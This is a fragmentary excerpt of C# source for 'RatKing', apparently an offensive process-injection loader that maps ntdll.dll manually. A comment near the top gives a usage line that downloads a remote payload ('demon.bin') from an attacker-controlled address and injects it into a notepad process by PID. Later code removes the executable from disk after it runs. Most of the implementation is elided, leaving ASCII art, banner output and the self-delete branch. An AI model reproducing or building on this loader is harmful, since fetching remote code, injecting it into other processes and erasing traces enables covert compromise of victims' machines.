...
// RatKing.exe -u "https://192.168.231.128:9090/demon.bin" -t notepad -p 8972 -k
...
(o      `.  /      \     \    /\     .' /      \  .'      o)
 ```---..   `.     /`.    '--'  '---' .'\     .'   ..---```
   ...
   RatKing       /    .'            `.    \
        ...
        {
            Console.WriteLine("Process Injector 4: RatKing (Manual Mapping ntdll.dll)");
            Console.WriteLine("");
        ...
        static async Task Main(string[] args)
        {
            ...
            else
            {
                ...
                if (options.Kill)
                {
                    SelfDelete("1");
                    Console.WriteLine("");
                    Console.WriteLine("[>] RatKing.exe removed from disk!");
                }
